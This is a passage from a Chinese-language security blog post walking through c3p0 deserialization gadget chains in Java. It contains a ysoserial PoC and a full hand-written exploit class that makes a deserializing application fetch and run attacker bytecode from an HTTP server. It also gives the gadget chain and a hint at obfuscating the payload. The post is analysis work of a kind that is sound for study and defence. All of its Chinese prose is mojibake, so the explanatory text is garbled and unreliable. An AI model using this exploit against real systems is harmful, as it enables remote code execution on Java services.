<br>‰æùËµñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>C3p0‰∏ªË¶ÅÊâìÁöÑÊòØÂ¶Ç‰∏ã‰∏âÁßçÊñπÂºè</p><ul><li>URLClassLoader ËøúÁ®ãÁ±ªÂä†ËΩΩ</li><li>JNDI Ê≥®ÂÖ•</li><li>HEX Â∫èÂàóÂåñÂ≠óËäÇÂä†ËΩΩÂô®ÂèçÂ∫èÂàóÂåñÊîªÂáª</li></ul><h2 id="URLClassLoader-ËøúÁ®ãÁ±ªÂä†ËΩΩ"><a href="#URLClassLoader-ËøúÁ®ãÁ±ªÂä†ËΩΩ" class="headerlink" title="URLClassLoader ËøúÁ®ãÁ±ªÂä†ËΩΩ"></a>URLClassLoader ËøúÁ®ãÁ±ªÂä†ËΩΩ</h2><h3 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h3><p>ÂÖàÁúãÂà©Áî®ÂÜçË∑üÈìæÂ≠êÔºåËøôÈáåÂà©Áî®Áõ¥Êé•Â∞ÜysoserialÁöÑjarÂåÖÂØº‰∏∫‰æùËµñÂà©Áî®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;  </span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.C3P0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">c3P0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> c3P0.getObject(<span class="string">&quot;http://127.0.0.1:8866/:test&quot;</span>);  </span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(object);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> oos.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>:test</code>Ëøô‰∏™Âç≥ÊâßË°åÂëΩ‰ª§ÁöÑÊÅ∂ÊÑèÂ≠óËäÇÁ†ÅÔºåÂú®Ëøô‰∏™Â≠óËäÇÁ†ÅË∑ØÂæÑÁî®pythonËµ∑‰∏™ÊúçÂä°Áî®‰∫éËøúÁ®ãÁ±ªÂä†ËΩΩ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111756605.png"><br>ËøêË°åÂç≥ÂèØÂºπËÆ°ÁÆóÂô®ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111744853.png"></p><h3 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøôÈáåÂÖàÂ∞ΩÈáèÂ∞ùËØïËá™Â∑±ÂàÜÊûê‰∏ÄÈÅçÊµÅÁ®ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readObject:205, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">main:17, C3p0Test (FastjsonPoc)</span><br></pre></td></tr></table></figure><p>‰ªéË∞ÉÁî®Ê†àÂèØ‰ª•ÂèëÁé∞ÔºåÊúÄÁªàÊòØÊù•Âà∞<code>PoolBackedDataSourceBase</code>Á±ª‰∏ãÁöÑreadObjectÊñπÊ≥ïÊâßË°åÁöÑÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111915762.png" alt="image-20240411191526647"><br>Ëøô‰∏™ifÂà§Êñ≠ÂÆåËÆ°ÁÆóÂô®Ë¢´ÂºπÂá∫ÔºåÁªßÁª≠Ë∑üËøõÔºåËøôÈáåÂÖàÁúãÁªìÊûú<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111915286.png" alt="image-20240411191541140"><br>ÊúÄÁªàÊòØÂú®<code>com/mchange/v2/naming/ReferenceableUtils.class</code>‰∏ãËøõË°åÁöÑÂÆû‰æãÂåñÔºåÁî±‰∫éÊòØÁî®ÁöÑysoserialÊâÄ‰ª•ËøôÈáåÁöÑ‰ª£Á†ÅÈÉΩÊòØÂèçÁºñËØëÁöÑÔºåËøòÊòØ‰∏çÁî®Ëøô‰∏™ÔºåÁúãÂéüÊú¨ÁöÑ‰ª£Á†ÅËøõË°åÂàÜÊûêÔºåËøôÈáåËá™Â∑±Â∞ùËØïÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÔºå‰ΩÜÊòØËá™Â∑±ËøòÊòØÊó†Ê≥ïÁã¨Á´ãÁêÜÊ∏ÖÊï¥‰∏™ÈÄªËæëÔºåÂÜô‰∏çÂá∫expÔºåtcl„ÄÇ„ÄÇ„ÄÇ<br>ËøôÈáåÂÖàÂ∞ùËØïËá™Â∑±ÂÜô‰∏™ÊúÄÂêéÂà©Áî®ÁöÑexpÔºåÂà©Áî®ysoserialÂàÜÊûê‰∏Ä‰∏ã<code>referenceToObject</code>ÊñπÊ≥ïÁöÑÂèÇÊï∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916363.png" alt="image-20240411191619194"><br>ËøôÈáåÂèØ‰ª•ÁúãÂà∞Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ<code>Reference</code>Á±ªÁöÑÂØπË±°ÔºåÈáåÈù¢Âê´ÊúâÊàë‰ª¨ÁöÑÂç±Èô©Á±ªÂíåËøúÁ®ãÂú∞ÂùÄÔºåÂÖ∂ÂÆÉÁöÑ‰∏∫nullÂç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916311.png" alt="image-20240411191630219"><br>‰ΩÜÊòØËøô‰∏™<code>Reference</code>Á±ªÊòØ‰∏Ä‰∏™ÊäΩË±°Á±ªÔºåÊ≤°Ê≥ïÁõ¥Êé•ÂÆû‰æãÂåñÔºåemmmÔºå‰∏çÁü•ÈÅìÂ§ßÂì•‰ª¨ÊÄé‰πàËß£ÂÜ≥ÁöÑÔºåÊàëËøôÂÑøË∑ëÁõ¥Êé•Êä•Èîô‰∫ÜÔºå‰∏çËøáÊó†ÊâÄË∞ìÔºåÁªßÁª≠ÂæÄÂêéÁúãÔºåÂú®<code>ReferenceIndirector#getObject()</code>‰∏≠Ë∞ÉÁî®‰∫Ü‰∏äÈù¢ÈÇ£‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916409.png" alt="image-20240411191650304"><br>ËøôÈáåÂÖ∂ÂÆûËøòÊúâ‰∏™lookupÂáΩÊï∞Ôºå‰ΩÜÊòØÊúâ‰∏™ifÂà§Êñ≠ÔºåÂèØ‰∏çÂèØÊéßËøôÈáåÂÖà‰∏çÁÆ°ÔºåÁÑ∂ÂêéÂÖ∂ÂÆÉÂ∞±Ê≤°Âï•‰∫ÜÔºåÁªßÁª≠ÂæÄ‰∏äÁúãÂà∞<code>PoolBackedDataSourceBase#readObject()</code>ÔºåËøôÈáåÊúâ‰∏™ifÂà§Êñ≠</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (o instanceof IndirectlySerialized)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917505.png" alt="image-20240411191707458"><br>ËøôÈáåÁöÑoÂøÖÈ°ªË¶Å‰∏∫<code>IndirectlySerialized</code>ÁöÑÂÆû‰æãÊâçËÉΩÊâßË°å<code>getObject</code>ÔºåË∞ÉÁî®ÂÆå<code>getObject</code>Âêé‰ºöÂ∞ÜoÂº∫ËΩ¨‰∏∫<code>ConnectionPoolDataSource</code>ÁöÑÂØπË±°Ôºå‰ΩÜÊòØËøô‰∏™Êé•Âè£‰∏çËÉΩÂèçÂ∫èÂàóÂåñ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917407.png" alt="image-20240411191722301"><br>Ëøô‰∏™Êé•Âè£‰∏çËÉΩÂèçÂ∫èÂàóÂåñËÉΩÁêÜËß£ÔºåÂõ†‰∏∫Ê≤°ÊúâÁªßÊâø<code>Serializable</code>ÔºåËøôÈáå‰∏∫‰ªÄ‰πàÈúÄË¶Å<code>ConnectionPoolDataSource</code>ËÉΩÂ§üÂèçÂ∫èÂàóÂåñÂë¢ÔºüÂÖ∂ÂÆûÁúã‰∫ÜÂæàÂ§öÊñáÁ´†ËøôÈáåÈÉΩÊ≤°ÊúâÂæàÊòéÁ°ÆÁöÑËß£ÈáäÔºåÊàëÁåúÊµãÊòØÂõ†‰∏∫Âú®Â∫èÂàóÂåñÁöÑÊó∂ÂÄôÂØπË±°oÊòØË¶ÅË¢´Â∫èÂàóÂåñÁöÑÔºå‰ΩÜÊòØÊâßË°åÂÆå<code>getObject()</code>ÂêéÂ∞±Ë¢´Âº∫ËΩ¨‰∏∫<code>ConnectionPoolDataSource</code>ÁöÑÂØπË±°ÔºåËøôÈÉ®ÂàÜ‰πüÊòØÈúÄË¶ÅË¢´Â∫èÂàóÂåñËøõÂéªÁöÑÔºåÈÇ£‰πàÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂ∞±‰ºöÊâßË°å<code>IndirectlySerialized -&gt; ConnectionPoolDataSource</code>ËøôÊ†∑ÁöÑËΩ¨Êç¢ÔºåÊâÄ‰ª•‰∏çËÉΩÂ§üÂèçÂ∫èÂàóÂåñÁöÑËØùÂ∞±‰∏çË°åÔºåËøôÈáåÂÖ∂ÂÆûËá™Â∑±‰πüÊúâÁÇπÊáµÔºåÂÖàËøôÊ†∑ÂêßÔºåÂà∞ËøôÈáå‰ºº‰πéÂèçÂ∫èÂàóÂåñÂ∞±Â∑≤ÁªèÊ≤°Ê≥ïË∑ü‰∫ÜÔºåÈÇ£‰πàÈ°∫ÁùÄÁúãÂ∫èÂàóÂåñÂéª<br>Êù•Âà∞<code>PoolBackedDataSourceBase#writeObject</code>‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917258.png" alt="image-20240411191732084"><br>Âà∞ËøôÈáåÂèØ‰ª•ÁúãÂà∞‰ºöÂÖàÂ∞ùËØïÂ∫èÂàóÂåñ<code>connectionPoolDataSource</code>ÔºåÊó†Ê≥ïÂ∫èÂàóÂåñÁöÑÂåñÂ∞±ËøõÂÖ•catchÔºåÊòæÁ§∫ËøôÈáåÊó†Ê≥ïÂ∫èÂàóÂåñÔºåÈÇ£‰πàËøõÂÖ•catchÁúãÁúã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">   com.mchange.v2.log.MLog.getLogger( <span class="built_in">this</span>.getClass() ).log(com.mchange.v2.log.MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, nse);  </span><br><span class="line">   <span class="keyword">try</span>   &#123;  </span><br><span class="line">      <span class="type">Indirector</span> <span class="variable">indirector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mchange.v2.naming.ReferenceIndirector();  </span><br><span class="line">      oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">catch</span> (IOException indirectionIOException)  </span><br><span class="line">   &#123; <span class="keyword">throw</span> indirectionIOException; &#125;  </span><br><span class="line">   <span class="keyword">catch</span> (Exception indirectionOtherException)  </span><br><span class="line">   &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + indirectionOtherException.toString() ); &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÊòØ<code>indirector.indirectForm</code>ËøõË°å‰∫ÜÂ§ÑÁêÜÔºåÁõ¥Êé•Ë∑üËøõËøô‰∏™ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception  </span><br><span class="line">   &#123; <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåËøîÂõû‰∫Ü<code>ReferenceSerialized</code>ÁöÑÂØπË±°ÔºåËÄåÂÆÉÊòØÂèØ‰ª•Ë¢´ÂèçÂ∫èÂàóÂåñÁöÑ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReferenceSerialized</span> <span class="keyword">implements</span> <span class="title class_">IndirectlySerialized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IndirectlySerialized</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span></span><br></pre></td></tr></table></figure><p>ËøôÊ†∑<code>connectionPoolDataSource</code>Â∞±‰ªé‰∏çÂèØÂ∫èÂàóÂåñÂèò‰∏∫‰∫ÜÂèØÂ∫èÂàóÂåñÔºåÂÆûÈôÖ‰∏äÂ∑≤ÁªèÊòØÂ∫èÂàóÂåñÁöÑ<code>ReferenceSerialized</code>ÁöÑÂØπË±°ÔºåÂà∞ËøôÈáåËøôÊù°ÈìæÂ∞±Âü∫Êú¨ÁªìÊùü‰∫Ü</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>‰∏äÈù¢ÊÉ≥ÂÜô‰∏™Áõ¥Êé•Âà©Áî®ÁöÑexp‰∏çÊòØÈÅáÂà∞‰∫Ü<code>Reference</code>Ê≤°Ê≥ïÁõ¥Êé•ÂÆû‰æãÂåñÁöÑÈóÆÈ¢ò‰∫ÜÂêóÔºåÂú®<code>JndiRefConnectionPoolDataSource</code>Á±ª‰∏ãÊúâ‰∏™<code>getReference()</code>ÊñπÊ≥ï‰ºöÁõ¥Êé•ËøîÂõû‰∏™ReferenceÂØπË±°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917698.png" alt="image-20240411191745624"><br>Âà©Áî®ËØ•ÊñπÊ≥ïÊûÑÈÄ†ReferenceÂØπË±°ÊîæÂÖ•ÊÅ∂ÊÑèÁ±ªÂíåÂú∞ÂùÄ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.stackmap.TypeData;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Self</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">pBS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);  </span><br><span class="line">        <span class="comment">//ÂèçÂ∞ÑËé∑ÂèñconnectionPoolDataSourceÂ±ûÊÄßÔºåÂ∞ÜÂÆÉËÆæÁΩÆ‰∏∫ÊÅ∂ÊÑèÁ±ª  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cPD</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        cPD.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        cPD.set(pBS,<span class="keyword">new</span> <span class="title class_">reference</span>());  </span><br><span class="line">  </span><br><span class="line">        serializer(pBS);  </span><br><span class="line">        unserializer(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">reference</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>,Referenceable &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializer</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        outputStream.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializer</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂêåÊó∂ÔºåËøô‰∏™‰πüËÉΩÂà©Áî®overlongencodingÊñπÊ≥ïÊ∑∑Ê∑Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917852.png" alt="image-20240411191759620"><br>‰ΩÜÊòØÊúÄÂÖ≥ÈîÆÁöÑÁ±ªËøòÊòØÊ≤°ËÉΩÊ∑∑Ê∑ÜÊéâÔºåÊúâÂæÖËøõ‰∏ÄÊ≠•Ê∑∑Ê∑Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918625.png" alt="image-20240411191813380"></p><h3 id="Âà©Áî®Èìæ"><a href="#Âà©Áî®Èìæ" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject -&gt;</span><br><span class="line">ObjectFactory#getObjectInstance</span><br></pre></td></tr></table></figure><h2 id="JNDIÊ≥®ÂÖ•"><a href="#JNDIÊ≥®ÂÖ•" class="headerlink" title="JNDIÊ≥®ÂÖ•"></a>JNDIÊ≥®ÂÖ•</h2><h3 id="ÂàÜÊûê-1"><a href="#ÂàÜÊûê-1" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøôÊù°ÈìæÊòØÂü∫‰∫éfastjsonÊàñjacksonÁöÑÔºåÁõ∏ÂΩì‰∫éÊòØfastjsonÁöÑÈìæ‰∫Ü<br>ËøôÊù°ÈìæÁöÑÊºèÊ¥ûÁÇπÂú®<code>JndiRefForwardingDataSource#dereference</code>‰∏ãÁöÑlookup<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918316.png" alt="image-20240411191837035"><br>ÂèØ‰ª•ÁúãÂà∞Âè™Ë¶Å<code>jndiName</code>ÂèÇÊï∞ÂèØÊéßÂ∞±ÂèØ‰ª•ÈÄ†ÊàêjndiÊ≥®ÂÖ•ÔºåÂÆÉÊòØÈÄöËøá<code>getJndiName()</code>ÊñπÊ≥ïËé∑ÂèñÔºåÁúãÁúãËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918598.png" 